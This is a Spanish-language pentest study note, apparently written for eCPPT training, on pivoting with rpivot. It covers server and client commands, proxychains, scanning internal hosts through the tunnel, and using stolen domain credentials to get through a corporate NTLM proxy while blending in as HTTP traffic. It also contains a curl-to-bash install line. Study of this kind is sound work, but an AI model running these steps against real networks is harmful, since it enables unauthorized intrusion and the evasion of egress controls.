## 🧠 Concepto clave

Rpivot es un proxy SOCKS inverso escrito en Python que crea un túnel entre una máquina interna comprometida y el atacante usando **HTTP como transporte**. Es la herramienta de elección cuando el entorno tiene restricciones de red que bloquean SSH y otros protocolos, pero permite tráfico HTTP saliente — escenario muy común en redes corporativas con proxies web obligatorios.

| Herramienta | Transporte | Requiere SSH | Proxy corporativo NTLM |
|---|---|---|---|
| `ssh -D` | SSH (TCP 22) | Sí | No |
| chisel | HTTP/WebSocket | No | No |
| sshuttle | SSH | Sí | No |
| **rpivot** | **HTTP puro** | **No** | **Sí — soporte nativo** |

La arquitectura es cliente-servidor inversa: el **servidor** corre en el atacante, el **cliente** corre en el pivot comprometido y conecta hacia fuera al servidor. Una vez establecida la conexión, el servidor expone un proxy SOCKS4 local en el atacante que enruta tráfico hacia la red interna a través del cliente.
```
[Atacante]                        [Pivot Ubuntu]              [Red interna]
server.py                         client.py
  :9999  ←── HTTP backconnect ──   → 10.10.14.18:9999
  :9050 (SOCKS proxy)                                    →    172.16.5.135:80
```

> [!info] **rpivot** 📄 [github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)
> Herramienta Python2 que implementa un proxy SOCKS4 reverso sobre HTTP. Consta de dos scripts: `server.py` (corre en el atacante, expone el SOCKS proxy y espera conexiones del cliente) y `client.py` (corre en el pivot comprometido, conecta al servidor y crea el túnel). El uso de HTTP como transporte permite atravesar proxies corporativos y firewalls que solo permiten tráfico web. Soporta autenticación NTLM para entornos con proxy corporativo autenticado con Active Directory.

---

## 📌 Instalación

> [!tip] Clonar rpivot e instalar Python2.7
> ```bash
> # Clonar el repositorio
> git clone https://github.com/klsecservices/rpivot.git
>
> # Instalar Python2.7 (rpivot requiere Python2, no funciona con Python3)
> sudo apt-get install python2.7
> ```
> rpivot está escrito en Python2 — uno de los pocos casos donde aún se necesita Python2.7 en un sistema moderno. Python3 no es compatible.

> [!tip] Instalación alternativa de Python2.7 con pyenv (si apt no lo tiene disponible)
> ```bash
> # Instalar pyenv — gestor de versiones de Python
> curl https://pyenv.run | bash
>
> # Añadir pyenv al PATH (añade las tres líneas al .bashrc)
> echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
> echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
> echo 'eval "$(pyenv init -)"' >> ~/.bashrc
> source ~/.bashrc
>
> # Instalar Python2.7 con pyenv y activarlo en la sesión actual
> pyenv install 2.7
> pyenv shell 2.7
>
> # Verificar versión activa
> python --version   # debe mostrar Python 2.7.x
> ```
> `pyenv install 2.7` — Descarga, compila e instala Python 2.7 sin tocar el Python del sistema.
> `pyenv shell 2.7` — Activa Python 2.7 solo para la sesión de shell actual — sin cambiar el Python global del sistema.

---

## 📌 Escenario completo
```
[Atacante 10.10.14.18]
    │  server.py escucha conexiones del cliente en :9999
    │  expone SOCKS4 proxy en 127.0.0.1:9050
    ▼
[Ubuntu pivot 10.129.202.64]
    │  client.py conecta al atacante :9999 (HTTP backconnect)
    │  tiene acceso a 172.16.5.0/23
    ▼
[Web server interno 172.16.5.135:80]
```

---

## 📌 Paso 1 — Lanzar el servidor rpivot en el atacante

> [!tip] Iniciar server.py en el atacante
> ```bash
> python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
> ```
> `--proxy-port 9050` — Puerto donde el servidor expondrá el proxy SOCKS4 local. Las herramientas del atacante (proxychains, firefox) se conectarán aquí para acceder a la red interna.
> `--server-port 9999` — Puerto donde el servidor escucha las conexiones entrantes del cliente rpivot en el pivot host. El cliente conecta aquí para establecer el túnel HTTP.
> `--server-ip 0.0.0.0` — Escuchar en todas las interfaces del atacante. Necesario para aceptar la conexión del pivot que viene de `10.129.202.64`.

---

## 📌 Paso 2 — Transferir rpivot al pivot host

> [!tip] Copiar el directorio rpivot completo al pivot con SCP
> ```bash
> scp -r rpivot ubuntu@10.129.202.64:/home/ubuntu/
> ```
> `-r` — Recursive: copia el directorio completo incluyendo todos los archivos Python de rpivot.
> `ubuntu@10.129.202.64:/home/ubuntu/` — Destino en el pivot host — directorio home del usuario ubuntu.

---

## 📌 Paso 3 — Ejecutar el cliente rpivot en el pivot host

> [!tip] Iniciar client.py en el pivot host — backconnect al atacante
> ```bash
> # En el Ubuntu pivot
> python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
> ```
> `--server-ip 10.10.14.18` — IP del **atacante** donde corre `server.py`. El cliente conecta activamente hacia fuera — de ahí el nombre "reverse SOCKS proxy".
> `--server-port 9999` — Puerto del servidor rpivot en el atacante. Debe coincidir con el `--server-port` de `server.py`.

Confirmación en el servidor (atacante) de que el cliente conectó:
```
New connection from host 10.129.202.64, source port 35226
```

---

## 📌 Paso 4 — Configurar proxychains y usar el proxy

> [!tip] Configurar proxychains para usar el SOCKS4 de rpivot
> ```bash
> tail -3 /etc/proxychains.conf
> # Debe contener:
> # socks4 127.0.0.1 9050
>
> # rpivot usa SOCKS4 — asegurarse de que NO sea socks5
> ```
> rpivot implementa SOCKS **versión 4** — a diferencia de chisel que usa SOCKS5. En `proxychains.conf` debe ser `socks4`, no `socks5`.

> [!tip] Acceder al servidor web interno a través del proxy rpivot
> ```bash
> # Navegar al servidor web interno con Firefox a través del proxy
> proxychains firefox-esr 172.16.5.135:80
>
> # O con curl
> proxychains curl http://172.16.5.135:80
>
> # Escanear el servidor web interno
> proxychains nmap -Pn -sT -p80,443,8080,8443 172.16.5.135
> ```

---

## 📌 Caso especial — Proxy corporativo con autenticación NTLM

Este es el escenario diferencial de rpivot respecto a todas las demás herramientas. En muchas redes corporativas el tráfico HTTP saliente pasa obligatoriamente por un **proxy autenticado con NTLM** vinculado al Active Directory. Chisel, socat y SSH fallan en este escenario porque no saben autenticarse contra el proxy NTLM. Rpivot tiene soporte nativo para esto.
```
[Pivot Ubuntu]
    │  solo puede salir a Internet a través del proxy corporativo
    ▼
[Proxy corporativo :8081]
    │  requiere autenticación NTLM con credenciales de dominio
    ▼
[Internet → Atacante]
```

> [!tip] Conectar client.py a través de un proxy HTTP con autenticación NTLM
> ```bash
> python2.7 client.py \
>     --server-ip 10.10.14.18 \
>     --server-port 8080 \
>     --ntlm-proxy-ip 172.16.5.1 \
>     --ntlm-proxy-port 8081 \
>     --domain INLANEFREIGHT \
>     --username victor \
>     --password Pass@123
> ```
> `--server-ip` — IP del atacante donde corre server.py.
> `--server-port 8080` — Puerto del servidor rpivot — usar 80 o 8080 hace que el tráfico parezca HTTP corporativo legítimo y tenga más posibilidades de atravesar el proxy.
> `--ntlm-proxy-ip 172.16.5.1` — IP del proxy corporativo que requiere autenticación NTLM.
> `--ntlm-proxy-port 8081` — Puerto del proxy corporativo.
> `--domain INLANEFREIGHT` — Nombre del dominio Windows para la autenticación NTLM.
> `--username victor` — Usuario de dominio con acceso a Internet a través del proxy.
> `--password Pass@123` — Contraseña del usuario de dominio.

> [!important] Las credenciales para el proxy NTLM son las del **usuario de dominio** cuya sesión se ha comprometido en el pivot host — no las del sistema pivot en sí. Si se han obtenido credenciales de un usuario de dominio mediante credential hunting, esas mismas credenciales pueden usarse aquí para autenticarse contra el proxy corporativo y establecer el túnel rpivot hacia el exterior.

---

## 📌 Comparativa rpivot vs chisel

Ambas herramientas crean túneles SOCKS sobre HTTP, pero tienen diferencias operacionales importantes:

| Criterio | rpivot | chisel |
|---|---|---|
| Lenguaje | Python2 | Go (binario compilado) |
| Versión SOCKS | SOCKS4 | SOCKS5 |
| Transporte | HTTP puro | HTTP/WebSocket |
| Proxy NTLM corporativo | ✓ soporte nativo | ✗ |
| Cifrado | No (HTTP plano) | Sí (HTTPS con --tls) |
| Dependencias en pivot | Python2.7 + scripts | Solo binario |
| Mantenimiento activo | Bajo (Python2 legacy) | Alto |

La regla práctica: usar **chisel** por defecto (más moderno, SOCKS5, binario standalone, TLS). Usar **rpivot** específicamente cuando el pivot solo puede salir a través de un **proxy HTTP con autenticación NTLM** — ese es el único escenario donde rpivot no tiene competidor directo entre las herramientas vistas.

---

## 🔗 Relaciones / Contexto

Rpivot cubre el caso extremo del pivoting en redes corporativas con egress filtering severo: no hay SSH, no hay puertos altos abiertos, todo el tráfico pasa por un proxy HTTP autenticado con Active Directory. En ese escenario, una vez obtenidas credenciales de dominio (a través de credential hunting, Pass-the-Hash, o cualquier otra técnica de las vistas anteriormente), rpivot permite establecer un túnel de pivoting completo usando esas mismas credenciales para autenticarse en el proxy corporativo — convirtiendo la infraestructura de seguridad de la propia empresa en el canal del túnel. En el contexto del eCPPT, este escenario representa el nivel más avanzado de pivoting: redes con controles de salida estrictos donde las técnicas estándar no funcionan.